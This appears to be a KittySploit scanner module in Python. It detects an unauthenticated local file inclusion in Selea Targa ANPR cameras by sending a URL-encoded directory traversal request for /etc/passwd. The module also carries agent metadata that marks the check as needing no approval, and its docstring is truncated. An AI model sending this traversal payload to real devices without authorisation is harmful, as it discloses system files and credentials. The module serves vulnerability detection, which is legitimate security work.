#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Selea Targa IP OCR-ANPR camera suffers from an unauthenticated local file inclusion vulnerability because inpu."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Selea Targa IP OCR-ANPR Camera - Local File Inclusion Detection',
        'description': 'Selea Targa IP OCR-ANPR camera suffers from an unauthenticated local file inclusion vulnerability because input passed through the Download Archive in Storage page using get_file.php script is not properly verified before being used to download files. This can be exploited to disclose the contents of arbitrary and sensitive files via directory traversal attacks and aid the attacker in disclosing clear-text credentials.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'iot', 'targa', 'lfi', 'camera', 'selea', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5616.php'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Selea Targa IP OCR-ANPR Camera - Local File Inclusion detected",
                path='/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
            )
            return True
        return False

